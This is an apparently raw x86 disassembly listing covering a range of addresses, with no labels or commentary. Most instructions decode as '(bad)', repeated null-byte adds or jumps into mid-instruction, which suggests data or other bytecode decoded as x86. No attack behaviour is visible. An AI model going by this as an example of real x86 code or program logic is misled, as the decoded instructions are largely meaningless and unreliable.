1100536d:	push   cs
1100536e:	add    BYTE PTR [eax],al
11005370:	add    BYTE PTR [eax],al
11005372:	push   es
11005373:	adc    al,0xfe
11005375:	add    DWORD PTR [eax+eiz*1],ecx
11005378:	add    al,BYTE PTR [eax]
1100537a:	add    BYTE PTR [eax],al
1100537c:	or     eax,0x2d08e02b
11005381:	sbb    esp,DWORD PTR [eax]
11005383:	add    BYTE PTR [eax],al
11005385:	add    BYTE PTR [eax],al
11005387:	or     eax,0x2bd52b
1100538c:	push   es
1100538d:	outs   dx,DWORD PTR ds:[esi]
1100538e:	data16 add BYTE PTR [eax],al
11005391:	or     al,BYTE PTR [eax]
11005393:	and    BYTE PTR [ecx],al
11005395:	add    BYTE PTR [eax],al
11005397:	add    BYTE PTR ds:0x2bc42b,cl
1100539d:	add    ah,bl
1100539f:	pop    ss
110053a0:	sub    eax,DWORD PTR [ebx]
110053a2:	push   ss
110053a3:	sub    eax,DWORD PTR [eax]
110053a5:	sub    al,0x0
110053a7:	add    BYTE PTR [edx],ch
110053a9:	add    BYTE PTR [eax],al
110053ab:	add    BYTE PTR [ecx],al
110053ad:	adc    BYTE PTR [eax],al
110053af:	add    BYTE PTR [edx],al
110053b1:	add    BYTE PTR ds:0x393400,al
110053b7:	inc    edx
110053b8:	add    BYTE PTR [eax],al
110053ba:	add    BYTE PTR [eax],al
110053bc:	adc    esi,DWORD PTR [eax]
110053be:	add    al,BYTE PTR [eax]
110053c0:	push   ss
110053c1:	add    al,BYTE PTR [eax]
110053c3:	add    BYTE PTR [esi],cl
110053c5:	add    BYTE PTR [eax],al
110053c7:	adc    DWORD PTR [esi],edx
110053c9:	adc    eax,DWORD PTR [ecx+edx*1]
110053cc:	add    al,0x45
110053ce:	add    DWORD PTR [eax],eax
110053d0:	add    BYTE PTR [eax],al
110053d2:	add    BYTE PTR [eax],al
110053d4:	add    BYTE PTR [eax],al
110053d6:	sub    edx,DWORD PTR [edi+0x11]
110053d9:	add    al,0x45
110053db:	adc    al,0x0
110053dd:	add    BYTE PTR [eax],al
110053df:	add    DWORD PTR cs:[eax],eax
110053e2:	add    BYTE PTR ds:0xa000000,bl
110053e8:	add    BYTE PTR [eax],al
110053ea:	add    BYTE PTR [ebp+0x1],bh
110053ed:	add    BYTE PTR [eax],al
110053ef:	xchg   esp,eax
110053f0:	add    BYTE PTR [eax],al
110053f2:	add    BYTE PTR ds:0xf3000001,bl
110053f8:	add    BYTE PTR [eax],al
110053fa:	add    BYTE PTR [esi+0x1],ah
110053fd:	add    BYTE PTR [eax],al
110053ff:	push   ecx
11005400:	add    BYTE PTR [eax],al
11005402:	add    BYTE PTR [eax+eax*1],dh
11005405:	add    BYTE PTR [eax],al
11005407:	pop    DWORD PTR [ecx]
11005409:	add    BYTE PTR [eax],al
1100540b:	add    DWORD PTR ds:[eax],eax
1100540e:	add    BYTE PTR [edx+0x0],ah
11005411:	add    BYTE PTR [eax],al
11005413:	in     al,0x0
11005415:	add    BYTE PTR [eax],al
11005417:	push   eax
11005418:	add    DWORD PTR [eax],eax
1100541a:	add    BYTE PTR [ecx-0x7dffffff],ch
11005420:	add    BYTE PTR [eax],al
11005422:	add    BYTE PTR [edi-0x42000000],ch
11005428:	add    BYTE PTR [eax],al
1100542a:	add    BYTE PTR [esi],cl
1100542c:	add    DWORD PTR [eax],eax
1100542e:	add    BYTE PTR [eax],al
11005430:	and    BYTE PTR [edx],al
11005432:	add    BYTE PTR [eax],al
11005434:	add    BYTE PTR [ebx],dl
11005436:	add    al,0x2b
11005438:	lahf   
11005439:	jle    0x11005448
1100543b:	add    BYTE PTR [eax],al
1100543d:	add    al,0x3a
1100543f:	push   cs
11005440:	add    DWORD PTR [eax],eax
11005442:	add    BYTE PTR [eax],ah
11005444:	add    DWORD PTR [eax],eax
11005446:	add    BYTE PTR [eax],al
11005448:	adc    eax,DWORD PTR [ebx+ebp*1]
1100544b:	mov    WORD PTR [edi],ss
1100544d:	sub    eax,DWORD PTR [ebx]
1100544f:	push   ss
11005450:	sub    eax,DWORD PTR [eax]
11005452:	sub    al,0x0
11005454:	sub    ebp,DWORD PTR [edi]
11005456:	add    BYTE PTR [eax],ah
11005458:	or     DWORD PTR [eax],eax
1100545a:	add    BYTE PTR [eax],al
1100545c:	adc    eax,DWORD PTR [eax+edi*1]
1100545f:	jne    0x11005460
11005461:	(bad)  
11005462:	(bad)  
11005463:	cmp    BYTE PTR [ebp+0x1],dh
11005466:	add    BYTE PTR [eax],al
11005468:	or     BYTE PTR [esi+0xc],bh
1100546b:	add    BYTE PTR [eax],al
1100546d:	add    al,0x6f
1100546f:	add    BYTE PTR [bx+si],al
11005472:	or     al,BYTE PTR [eax]
11005474:	and    BYTE PTR [eax],cl
11005476:	add    BYTE PTR [eax],al
11005478:	add    BYTE PTR [ebx],dl
1100547a:	add    al,0x38
1100547c:	pop    eax
1100547d:	(bad)  
1100547e:	(bad)  
1100547f:	(bad)  
11005480:	cmp    BYTE PTR [edx],dl
11005482:	add    DWORD PTR [eax],eax
11005484:	add    BYTE PTR [eax],ah
11005486:	or     al,0x0
11005488:	add    BYTE PTR [eax],al
1100548a:	adc    eax,DWORD PTR [eax+edi*1]
1100548d:	inc    edi
1100548e:	(bad)  
1100548f:	(bad)  
11005490:	(bad)  
11005491:	jle    0x110054a2
11005493:	add    BYTE PTR [eax],al
11005495:	add    al,0x38
11005497:	lds    eax,FWORD PTR [eax]
11005499:	add    BYTE PTR [eax],al
1100549b:	add    BYTE PTR [esi+0xd],bh
1100549e:	add    BYTE PTR [eax],al
110054a0:	add    al,0x16
110054a2:	inc    BYTE PTR [ecx]
110054a4:	or     eax,0x1020
110054a9:	add    BYTE PTR [ebx],dl
110054ab:	add    al,0x38
110054ad:	daa    
110054ae:	(bad)  
110054af:	(bad)  
110054b0:	dec    DWORD PTR [ecx]
110054b2:	cmp    ah,al
110054b4:	add    BYTE PTR [eax],al
110054b6:	add    BYTE PTR [eax],ah
110054b8:	add    al,0x0
110054ba:	add    BYTE PTR [eax],al
110054bc:	adc    eax,DWORD PTR [eax+edi*1]
110054bf:	adc    eax,0x2bffffff
110054c4:	mov    ds:0x37e,eax
110054c9:	add    al,0x6f
110054cb:	push   0xa0a0000
110054d0:	push   ss
110054d1:	or     esp,DWORD PTR [eax]
110054d3:	adc    DWORD PTR [eax],eax
110054d5:	add    BYTE PTR [eax],al
110054d7:	adc    eax,DWORD PTR [eax+edi*1]
110054da:	cli    
110054db:	(bad)  
110054dc:	(bad)  
110054dd:	jmp    FWORD PTR [ebx]
110054df:	inc    edi
110054e0:	add    BYTE PTR [eax],ah
110054e2:	adc    al,BYTE PTR [eax]
110054e4:	add    BYTE PTR [eax],al
110054e6:	adc    eax,DWORD PTR [eax+edi*1]
110054e9:	jmp    0x110054e9
110054eb:	(bad)  
110054ec:	(bad)  
110054ed:	cmp    BYTE PTR [edx+0x0],dl
110054f3:	push   es
110054f4:	pop    es
110054f5:	outs   dx,DWORD PTR ds:[esi]
110054f6:	imul   eax,DWORD PTR [eax],0x26740a00
110054fc:	add    BYTE PTR [eax],al
110054fe:	add    DWORD PTR [eax+ecx*1],ecx
11005501:	outs   dx,DWORD PTR ds:[esi]
11005502:	push   0x0
11005504:	add    BYTE PTR [edx],cl
11005506:	or     eax,0xd20
1100550b:	add    BYTE PTR [ebx],dl
1100550d:	add    al,0x38
1100550f:	(bad)  
11005512:	dec    DWORD PTR [ecx]
11005514:	sub    eax,0x6206e
11005519:	add    BYTE PTR [eax],al
1100551b:	adc    eax,DWORD PTR [eax+edi*1]
1100551e:	mov    dh,0xfe
11005520:	(bad)  
11005521:	(bad)  
11005522:	cmp    BYTE PTR [edi+edi*8-0x1],dh
11005526:	inc    DWORD PTR [edi]
11005528:	push   es
11005529:	outs   dx,DWORD PTR ds:[esi]
1100552a:	imul   eax,DWORD PTR [eax],0x0
1100552d:	or     bh,dh
1100552f:	add    al,0xd
11005531:	and    BYTE PTR [ebx],dl
11005533:	add    BYTE PTR [eax],al
11005535:	add    BYTE PTR [ebx],dl
11005537:	add    al,0x38
11005539:	fwait
1100553a:	(bad)  
1100553b:	(bad)  
1100553c:	dec    DWORD PTR [ecx]
1100553e:	sub    eax,0x520b2
11005543:	add    BYTE PTR [eax],al
11005545:	adc    eax,DWORD PTR [eax+edi*1]
11005548:	mov    esi,?
1100554a:	(bad)  
1100554b:	(bad)  
1100554c:	cmp    BYTE PTR [eax+eax*1+0x200000],cl
11005553:	add    BYTE PTR [eax],al
11005555:	add    BYTE PTR [ebx],dl
11005557:	add    al,0x38
11005559:	jnp    0x11005559
1100555b:	(bad)  
1100555c:	call   DWORD PTR [edi]
1100555e:	sub    eax,DWORD PTR [eax]
11005560:	or     eax,0xb20
11005565:	add    BYTE PTR [ebx],dl
11005567:	add    al,0x38
11005569:	imul   edi,esi,0xffffffff
1100556c:	dec    DWORD PTR [ecx]
1100556e:	cmp    dl,BYTE PTR [edx-0x1]
11005571:	(bad)  
11005572:	jmp    DWORD PTR [eax]
11005574:	push   cs
11005575:	add    BYTE PTR [eax],al
11005577:	add    BYTE PTR [ebx],dl
11005579:	add    al,0x38
1100557b:	pop    ecx
1100557c:	(bad)  
1100557d:	(bad)  
1100557e:	(bad)  
1100557f:	cmp    dl,dl
11005581:	(bad)  
11005582:	(bad)  
11005583:	inc    DWORD PTR [eax]
11005585:	pop    es
11005586:	pop    ss
11005587:	pop    eax
11005588:	or     esp,DWORD PTR [eax]
1100558a:	pop    es
1100558b:	add    BYTE PTR [eax],al
1100558d:	add    BYTE PTR [ebx],dl
1100558f:	add    al,0x38
11005591:	inc    ebx
11005592:	(bad)  
11005593:	(bad)  
11005594:	jmp    FWORD PTR [ebx]
11005596:	nop
11005597:	jle    0x110055a8
11005599:	add    BYTE PTR [eax],al
1100559b:	add    al,0x16
1100559d:	inc    BYTE PTR [ecx]
1100559f:	or     eax,0x320
110055a4:	add    BYTE PTR [ebx],dl
110055a6:	add    al,0x38
110055a8:	sub    al,0xfe
110055aa:	(bad)  
110055ab:	dec    DWORD PTR [ecx]
110055ad:	cmp    ch,BYTE PTR [esi]
110055af:	(bad)  
110055b0:	(bad)  
110055b1:	jmp    DWORD PTR [eax]
110055b3:	or     al,BYTE PTR [eax]
110055b5:	add    BYTE PTR [eax],al
110055b7:	adc    eax,DWORD PTR [eax+edi*1]
110055ba:	sbb    bh,dh
110055bc:	(bad)  
110055bd:	jmp    FWORD PTR [ebx]
110055bf:	add    BYTE PTR [eax],cl
110055c1:	jle    0x110055d1
110055c3:	add    BYTE PTR [eax],al
110055c5:	add    al,0x6f
110055c7:	ins    BYTE PTR es:[edi],dx
110055c8:	add    BYTE PTR [eax],al
110055ca:	or     al,BYTE PTR [eax]
110055cc:	and    BYTE PTR [edi],cl
110055ce:	add    BYTE PTR [eax],al
110055d0:	add    BYTE PTR [ebx],dl
110055d2:	add    al,0x38
110055d4:	add    dh,bh
110055d6:	(bad)  
110055d7:	(bad)  
110055d8:	cmp    BYTE PTR [ebx],al
110055da:	(bad)  
110055db:	(bad)  
110055dc:	jmp    FWORD PTR [edx]
110055de:	add    BYTE PTR [eax],al
110055e0:	adc    esi,DWORD PTR [eax]
110055e2:	or     BYTE PTR [eax],al
110055e4:	pop    edx
110055e5:	add    BYTE PTR [eax],al
110055e7:	add    BYTE PTR [edi],cl
110055e9:	add    BYTE PTR [eax],al
110055eb:	adc    DWORD PTR [edx],eax
110055ed:	outs   dx,DWORD PTR ds:[esi]
110055ee:	ins    DWORD PTR es:[edi],dx
110055ef:	add    BYTE PTR [eax],al
110055f1:	or     cl,BYTE PTR [edx]
110055f3:	and    BYTE PTR [ecx+0x35f69ac],ah
110055f9:	pop    eax
110055fa:	or     edx,DWORD PTR [esi]
110055fc:	and    eax,0x25333217
11005601:	or     al,0x6
11005603:	or     BYTE PTR [esi],al
11005605:	or     BYTE PTR [edx+0xff2025],dl
1100560b:	add    BYTE PTR [eax],al
1100560d:	pop    edi
1100560e:	pop    es
1100560f:	and    eax,0x610b5817
11005614:	ror    BYTE PTR ds:0x7631e25,cl
1100561a:	and    eax,0x610b5817
1100561f:	rcl    BYTE PTR [ebx],cl
11005621:	add    al,0x26
11005623:	adc    DWORD PTR [ecx+ecx*1],eax
11005626:	adc    eax,DWORD PTR [ecx*1+0x621e0411]
1100562d:	or     DWORD PTR [eax-0x2f],esp
11005630:	popf   
11005631:	pop    ss
11005632:	pop    eax
11005633:	and    eax,0x32698e06
11005638:	(bad)  
11005639:	es push es
1100563b:	jae    0x110056ab
1100563d:	add    BYTE PTR [eax],al
1100563f:	or     ch,BYTE PTR [eax]
11005641:	outs   dx,DWORD PTR ds:[esi]
11005642:	add    BYTE PTR [eax],al
11005644:	or     ch,BYTE PTR [edx]
11005646:	add    BYTE PTR [eax],al
11005648:	adc    esi,DWORD PTR [eax]
1100564a:	add    DWORD PTR [eax],eax
1100564c:	or     al,BYTE PTR [eax]
1100564e:	add    BYTE PTR [eax],al
11005650:	add    BYTE PTR [eax],al
11005652:	add    BYTE PTR [eax],al
11005654:	add    ch,BYTE PTR [eax]
11005656:	adc    al,BYTE PTR [eax]
11005658:	add    BYTE PTR [edx],cl
1100565a:	add    BYTE PTR [eax],al
1100565c:	add    BYTE PTR [edx],ch
1100565e:	add    BYTE PTR [eax],al
11005660:	adc    esi,DWORD PTR [eax]
11005662:	add    al,BYTE PTR [eax]
11005664:	push   ebx
11005665:	add    BYTE PTR [eax],al
11005667:	add    BYTE PTR [eax],dl
11005669:	add    BYTE PTR [eax],al
1100566b:	adc    DWORD PTR [eax],eax
1100566d:	add    dh,BYTE PTR [ebx+0x70]
11005670:	add    BYTE PTR [eax],al
11005672:	or     cl,BYTE PTR [edx]
11005674:	push   es
11005675:	add    ch,BYTE PTR [edi+0x71]
11005678:	add    BYTE PTR [eax],al
1100567a:	or     ch,BYTE PTR [edi+0x72]
1100567d:	add    BYTE PTR [eax],al
1100567f:	or     al,BYTE PTR [eax]
11005681:	push   es
11005682:	outs   dx,DWORD PTR ds:[esi]
11005683:	jae    0x11005685
11005685:	add    BYTE PTR [edx],cl
11005687:	add    al,BYTE PTR es:[esi]
1100568a:	outs   dx,DWORD PTR ds:[esi]
1100568b:	je     0x1100568d
1100568d:	add    BYTE PTR [edx],cl
1100568f:	outs   dx,DWORD PTR ds:[esi]
11005690:	jne    0x11005692
11005692:	add    BYTE PTR [edx],cl
11005694:	add    BYTE PTR [esi],al
11005696:	outs   dx,DWORD PTR ds:[esi]
11005697:	je     0x11005699
11005699:	add    BYTE PTR [edx],cl
1100569b:	or     eax,DWORD PTR [edi]
1100569d:	sub    eax,0x32b171f
110056a2:	push   ss
110056a3:	sub    eax,DWORD PTR [eax]
110056a5:	sub    al,0x0
110056a7:	sub    eax,DWORD PTR [eax]
110056a9:	sub    BYTE PTR [ebx],bl
110056ab:	add    BYTE PTR [eax],al
110056ad:	or     dh,BYTE PTR [edx+0x7f]
110056b0:	add    al,0x0
110056b2:	jo     0x11005723
110056b4:	sbb    al,0x0
110056b6:	add    BYTE PTR [edx],cl
110056b8:	jae    0x110056d8
110056ba:	add    BYTE PTR [eax],al
110056bc:	or     bh,BYTE PTR [edx+0x2a]
110056bf:	add    BYTE PTR [ebx],bl
110056c1:	xor    BYTE PTR [edx],al
110056c3:	add    BYTE PTR [ebx],dl
110056c5:	add    al,BYTE PTR [eax]
110056c7:	add    BYTE PTR [ecx],dl
110056c9:	add    BYTE PTR [eax],al
110056cb:	adc    DWORD PTR [esi],edx
110056cd:	adc    eax,DWORD PTR [esi]
110056cf:	adc    DWORD PTR [esi],eax
110056d1:	inc    ebp
110056d2:	add    DWORD PTR [eax],eax
110056d4:	add    BYTE PTR [eax],al
110056d6:	add    BYTE PTR [eax],al
110056d8:	add    BYTE PTR [eax],al
110056da:	sub    ecx,DWORD PTR [ebx+0x11]
110056dd:	push   es
110056de:	inc    ebp
110056df:	adc    DWORD PTR [eax],eax
110056e1:	add    BYTE PTR [eax],al
110056e3:	adc    al,BYTE PTR [eax]
110056e5:	add    BYTE PTR [eax],al
110056e7:	cmp    DWORD PTR [eax],eax
110056e9:	add    BYTE PTR [eax],al
110056eb:	rol    DWORD PTR [eax],cl
110056ed:	add    BYTE PTR [eax],al
110056ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110056f0:	add    BYTE PTR [eax],al
110056f2:	add    BYTE PTR [ecx+0x42000001],dh
110056f8:	add    DWORD PTR [eax],eax
110056fa:	add    BYTE PTR [ecx+0x4000000],dl
11005700:	add    DWORD PTR [eax],eax
11005702:	add    BYTE PTR [edx+0x0],cl
11005705:	add    BYTE PTR [eax],al
11005707:	add    DWORD PTR es:[eax],eax
1100570a:	add    BYTE PTR [ecx+0x0],bh
1100570d:	add    BYTE PTR [eax],al
1100570f:	push   ebp
11005710:	add    DWORD PTR [eax],eax
11005712:	add    dh,ah
11005714:	add    BYTE PTR [eax],al
11005716:	add    BYTE PTR [eax+eax*1+0x200000],bh
1100571d:	add    BYTE PTR [eax],al
1100571f:	test   BYTE PTR [eax],0x0
11005722:	add    BYTE PTR [ebx+0x0],ah
11005725:	add    BYTE PTR [eax],al
11005727:	add    BYTE PTR [edx+ecx*1],dl
1100572a:	add    BYTE PTR [edx],al
1100572c:	or     eax,0x20041316
11005731:	add    BYTE PTR [eax],al
11005733:	add    BYTE PTR [eax],al
11005735:	adc    eax,DWORD PTR [esi]
11005737:	sub    esp,DWORD PTR [ebx+0x6538]
1100573d:	add    BYTE PTR [eax],ah
1100573f:	push   cs
11005740:	add    BYTE PTR [eax],al
11005742:	add    BYTE PTR [ebx],dl
11005744:	push   es
11005745:	sub    edx,DWORD PTR [ebp+0x49f7207]
1100574b:	add    BYTE PTR [eax+0x6f],dh
1100574e:	sbb    al,BYTE PTR [eax]
11005750:	add    BYTE PTR [edx],cl
11005752:	sub    eax,0x12038
11005757:	add    BYTE PTR [eax],al
11005759:	adc    eax,DWORD PTR [esi]
1100575b:	cmp    BYTE PTR [edi+edi*8-0x1],bh
1100575f:	(bad)  
11005760:	cmp    BYTE PTR [edx+0x20000000],bh
11005766:	or     BYTE PTR [eax],al
11005768:	add    BYTE PTR [eax],al
1100576a:	adc    eax,DWORD PTR [esi]
1100576c:	cmp    BYTE PTR [ebx-0x1],ch
1100576f:	(bad)  
11005770:	inc    DWORD PTR [edi]
11005772:	jb     0x1100571b
11005774:	add    al,0x0
11005776:	jo     0x110057e7
11005778:	sbb    al,BYTE PTR [eax]
1100577a:	add    BYTE PTR [edx],cl
1100577c:	sub    eax,0x10200e
11005781:	add    BYTE PTR [eax],al
11005783:	adc    eax,DWORD PTR [esi]
11005785:	cmp    BYTE PTR [edx-0x1],dl
11005788:	(bad)  
11005789:	jmp    FWORD PTR [ebx]
1100578b:	mov    dl,0x17
1100578d:	sub    eax,DWORD PTR [ebx]
1100578f:	push   ss
11005790:	sub    eax,DWORD PTR [eax]
11005792:	sub    al,0x0
11005794:	and    BYTE PTR [edx],cl
11005796:	add    BYTE PTR [eax],al
11005798:	add    BYTE PTR [ebx],dl
1100579a:	push   es
1100579b:	cmp    BYTE PTR [edi+edi*8],bh
1100579e:	(bad)  
1100579f:	call   DWORD PTR [esi]
110057a1:	sub    ebx,DWORD PTR [ecx+edx*1+0x4]
110057a5:	or     DWORD PTR [esi+0x1304fe69],ecx
110057ab:	add    eax,0x620
110057b0:	add    BYTE PTR [ebx],dl
110057b2:	push   es
110057b3:	cmp    BYTE PTR [edi+edi*8],ah
110057b6:	(bad)  
110057b7:	call   DWORD PTR [ecx]
110057b9:	add    eax,0x7c3a
110057be:	add    BYTE PTR [eax],ah
110057c0:	add    eax,DWORD PTR [eax]
110057c2:	add    BYTE PTR [eax],al
110057c4:	adc    eax,DWORD PTR [esi]
110057c6:	cmp    BYTE PTR [ecx],dl
110057c8:	(bad)  
110057c9:	(bad)  
110057ca:	(bad)  
110057cb:	cmp    BYTE PTR [esi+0x0],bl
110057d1:	adc    DWORD PTR [edi+edx*1],eax
110057d4:	pop    eax
110057d5:	adc    eax,DWORD PTR [eax+eiz*1]
110057d8:	or     eax,0x13000000
110057dd:	push   es
110057de:	cmp    cl,bh
110057e0:	(bad)  
110057e1:	(bad)  
110057e2:	jmp    FWORD PTR [ebx]
110057e4:	mov    esi,0x6f190700
110057e9:	sub    eax,0xa0a0000
110057ee:	and    BYTE PTR [edx],al
110057f0:	add    BYTE PTR [eax],al
110057f2:	add    BYTE PTR [ebx],dl
110057f4:	push   es
110057f5:	cmp    dl,ah
110057f7:	(bad)  
110057f8:	(bad)  
110057f9:	(bad)  
110057fa:	cmp    BYTE PTR [edi+0x0],bh
110057fd:	add    BYTE PTR [eax],al
110057ff:	adc    eax,DWORD PTR ds:0xc20
11005805:	add    BYTE PTR [ebx],dl
11005807:	push   es
11005808:	cmp    bh,cl
1100580a:	(bad)  
1100580b:	(bad)  
1100580c:	call   DWORD PTR [ecx]
1100580e:	add    eax,0xf20bf2d
11005813:	add    BYTE PTR [eax],al
11005815:	add    BYTE PTR [ebx],dl
11005817:	push   es
11005818:	cmp    BYTE PTR [edi+0x2bfffffe],bh
1100581e:	(bad)  
1100581f:	and    BYTE PTR [edi],al
11005821:	add    BYTE PTR [eax],al
11005823:	add    BYTE PTR [ebx],dl
11005825:	push   es
11005826:	cmp    BYTE PTR [ecx+0x7fffffe],dh
1100582c:	jb     0x110057dd
1100582e:	add    al,0x0
11005830:	jo     0x110058a1
11005832:	sbb    al,BYTE PTR [eax]
11005834:	add    BYTE PTR [edx],cl
11005836:	push   ss
11005837:	inc    BYTE PTR [ecx]
11005839:	sub    eax,esp
1100583b:	or     DWORD PTR [ecx],edx
1100583d:	add    al,0x9a
1100583f:	or     eax,DWORD PTR [eax]
11005841:	and    BYTE PTR [ecx],cl
11005843:	add    BYTE PTR [eax],al
11005845:	add    BYTE PTR [ebx],dl
11005847:	push   es
11005848:	cmp    BYTE PTR [edi+0x7fffffe],cl
1100584e:	jb     0x11005807
11005850:	add    al,0x0
11005852:	jo     0x110058c3
11005854:	sbb    al,BYTE PTR [eax]
11005856:	add    BYTE PTR [edx],cl
11005858:	cmp    ch,BYTE PTR [edi]
1100585a:	(bad)  
1100585b:	(bad)  
1100585c:	jmp    DWORD PTR [eax]
1100585e:	add    eax,0x13000000
11005863:	push   es
11005864:	cmp    BYTE PTR [ebx-0x2],dh
11005867:	(bad)  
11005868:	(bad)  
11005869:	cmp    bh,dh
1100586b:	(bad)  
1100586c:	(bad)  
1100586d:	inc    DWORD PTR [esi]
1100586f:	or     al,0x20
11005871:	or     eax,DWORD PTR [eax]
11005873:	add    BYTE PTR [eax],al
11005875:	adc    eax,DWORD PTR [esi]
11005877:	cmp    BYTE PTR [eax-0x2],ah
1100587a:	(bad)  
1100587b:	jmp    FWORD PTR [ebx]
1100587d:	pop    edi
1100587e:	add    BYTE PTR [eax],ch
11005880:	jbe    0x11005882
11005882:	add    BYTE PTR [edx],cl
11005884:	push   es
11005885:	jae    0x110058fe
11005887:	add    BYTE PTR [eax],al
11005889:	or     ch,BYTE PTR [edi+0x78]
1100588c:	add    BYTE PTR [eax],al
1100588e:	or     al,BYTE PTR [eax]
11005890:	add    dh,bl
11005892:	aaa    
11005893:	add    BYTE PTR es:[eax],ch
11005896:	sbb    eax,DWORD PTR [eax]
11005898:	add    BYTE PTR [edx],cl
1100589a:	jb     0x1100585b
1100589c:	add    al,0x0
1100589e:	jo     0x1100590f
110058a0:	sbb    al,0x0
110058a2:	add    BYTE PTR [edx],cl
110058a4:	push   es
110058a5:	sub    BYTE PTR [ecx+0x0],bh
110058a8:	add    BYTE PTR [edx],cl
110058aa:	sub    BYTE PTR [ebx],dh
110058ac:	add    BYTE PTR [eax],al
110058ae:	or     al,BYTE PTR [eax]
110058b0:	jb     0x11005899
110058b2:	add    al,0x0
110058b4:	jo     0x110058c0
110058b6:	sub    BYTE PTR [esi+0x0],dh
110058b9:	add    BYTE PTR [edx],cl
110058bb:	push   es
110058bc:	jae    0x11005935
110058be:	add    BYTE PTR [eax],al
110058c0:	or     ch,BYTE PTR [edi+0x78]
110058c3:	add    BYTE PTR [eax],al
110058c5:	or     al,BYTE PTR [eax]
110058c7:	add    dh,bl
110058c9:	add    BYTE PTR [eax],al
110058cb:	add    BYTE PTR [eax],ah
110058cd:	add    al,0x0
110058cf:	add    BYTE PTR [eax],al
110058d1:	adc    eax,DWORD PTR [esi]
110058d3:	cmp    BYTE PTR [esi+edi*8],al
110058d6:	(bad)  
110058d7:	(bad)  
110058d8:	cmp    bl,dh
110058da:	(bad)  
110058db:	(bad)  
110058dc:	dec    DWORD PTR [eax]
110058de:	sub    al,BYTE PTR [eax]
110058e0:	add    DWORD PTR [eax],edx
110058e2:	add    BYTE PTR [eax],al
110058e4:	add    BYTE PTR [eax],al
110058e6:	mov    dl,0x1
110058e8:	adc    eax,0x383701c7
110058ed:	add    BYTE PTR [eax],al
110058ef:	add    DWORD PTR [ebx],edx
110058f1:	xor    BYTE PTR [edx],al
110058f3:	add    BYTE PTR [edx],cl
	...
110058fd:	add    eax,DWORD PTR [eax+ebp*1]
11005900:	and    eax,DWORD PTR [eax]
11005902:	add    BYTE PTR [esi],al
11005904:	add    BYTE PTR [edx],ch
11005906:	add    BYTE PTR [eax],al
11005908:	sbb    esi,DWORD PTR [eax]
1100590a:	add    al,0x0
1100590c:	push   es
1100590d:	add    DWORD PTR [eax],eax
1100590f:	add    BYTE PTR [edx],dl
11005911:	add    BYTE PTR [eax],al
11005913:	adc    DWORD PTR [esi],edx
11005915:	adc    eax,DWORD PTR [esi]
11005917:	adc    DWORD PTR [esi],eax
11005919:	inc    ebp
1100591a:	add    DWORD PTR [eax],eax
1100591c:	add    BYTE PTR [eax],al
1100591e:	add    BYTE PTR [eax],al
11005920:	add    BYTE PTR [eax],al
11005922:	add    BYTE PTR [edx-0x4d],dh
11005925:	add    DWORD PTR [eax],eax
11005927:	jo     0x11005933
11005929:	add    BYTE PTR [eax],ch
1100592b:	jp     0x1100592d
1100592d:	add    BYTE PTR [edx],cl
1100592f:	outs   dx,DWORD PTR ds:[esi]
11005930:	inc    edi
11005931:	add    BYTE PTR [eax],al
11005933:	or     cl,BYTE PTR ds:0x600082b
11005939:	or     al,0x38
1100593b:	fld    DWORD PTR [eax]
1100593d:	add    BYTE PTR [eax],al
1100593f:	and    BYTE PTR [ecx],al
11005941:	add    BYTE PTR [eax],al
11005943:	add    BYTE PTR [ebx],dl
11005945:	push   es
11005946:	sub    eax,DWORD PTR [edx]
11005948:	sub    ebx,DWORD PTR [ebx]
1100594a:	adc    DWORD PTR [esi],eax
1100594c:	inc    ebp
1100594d:	add    eax,0x4b000000
11005952:	add    BYTE PTR [eax],al
11005954:	add    bl,ah
11005956:	(bad)  
11005957:	(bad)  
11005958:	call   DWORD PTR [esi+0x0]
1100595b:	add    BYTE PTR [eax],al
1100595d:	adc    eax,DWORD PTR [eax]
1100595f:	add    BYTE PTR [eax],al
11005961:	and    BYTE PTR [eax],al
11005963:	add    BYTE PTR [eax],al
11005965:	sub    eax,DWORD PTR [eax]
11005967:	or     DWORD PTR [edi+0x4f],ebp
1100596a:	add    BYTE PTR [eax],al
1100596c:	or     dl,BYTE PTR [ebx]
1100596e:	add    al,0x20
11005970:	add    eax,DWORD PTR [eax]
11005972:	add    BYTE PTR [eax],al
11005974:	adc    eax,DWORD PTR [esi]
11005976:	sub    edx,edx
11005978:	adc    DWORD PTR [ebp*1+0x4200b],eax
1100597f:	add    BYTE PTR [eax],al
11005981:	adc    eax,DWORD PTR [esi]
11005983:	sub    eax,ebp
11005985:	sub    ebp,DWORD PTR [ebx]
11005987:	or     DWORD PTR [edi+0x50],ebp
1100598a:	add    BYTE PTR [eax],al
1100598c:	or     dh,BYTE PTR [edx+ebx*1+0x0]
11005990:	add    BYTE PTR [ecx],al
11005992:	or     eax,DWORD PTR [eax]
11005994:	push   es
11005995:	jb     0x11005984
11005997:	add    al,0x0
11005999:	jo     0x110059a2
1100599b:	sub    BYTE PTR [ebx+0x0],bh
1100599e:	add    BYTE PTR [edx],cl
110059a0:	sub    BYTE PTR [eax+eax*1+0x0],bh
110059a4:	or     cl,BYTE PTR [edx]
110059a6:	add    BYTE PTR [eax],ah
110059a8:	add    BYTE PTR [eax],al
110059aa:	add    BYTE PTR [eax],al
110059ac:	adc    eax,DWORD PTR [esi]
110059ae:	sub    ebx,DWORD PTR [edx+0x220b52b]
110059b4:	add    BYTE PTR [eax],al
110059b6:	add    BYTE PTR [ebx],dl
110059b8:	push   es
110059b9:	sub    ecx,DWORD PTR [edi-0x8823]
110059bf:	jmp    FWORD PTR [ebx]
110059c1:	adc    edx,DWORD PTR [ecx]
110059c3:	push   es
110059c4:	inc    ebp
110059c5:	add    eax,DWORD PTR [eax]
110059c7:	add    BYTE PTR [eax],al
110059c9:	and    eax,0x38000000
110059ce:	add    BYTE PTR [eax],al
110059d0:	add    BYTE PTR [eax],bl
110059d2:	add    BYTE PTR [eax],al
110059d4:	add    BYTE PTR [ecx],cl
110059d6:	jne    0x11005a02
110059d8:	add    BYTE PTR [eax],al
110059da:	add    DWORD PTR [ebx],edx
110059dc:	add    eax,0xfe140511
110059e1:	add    DWORD PTR [ebx],edx
110059e3:	add    al,0x20
110059e5:	add    al,BYTE PTR [eax]
110059e7:	add    BYTE PTR [eax],al
110059e9:	adc    eax,DWORD PTR [esi]
110059eb:	sub    edx,ebp
110059ed:	adc    DWORD PTR [ebp*1+0x2026],eax
110059f4:	add    BYTE PTR [eax],al
110059f6:	adc    eax,DWORD PTR [esi]
110059f8:	sub    ecx,eax
110059fa:	sub    eax,DWORD PTR [eax]
110059fc:	adc    DWORD PTR ds:0x546f,eax
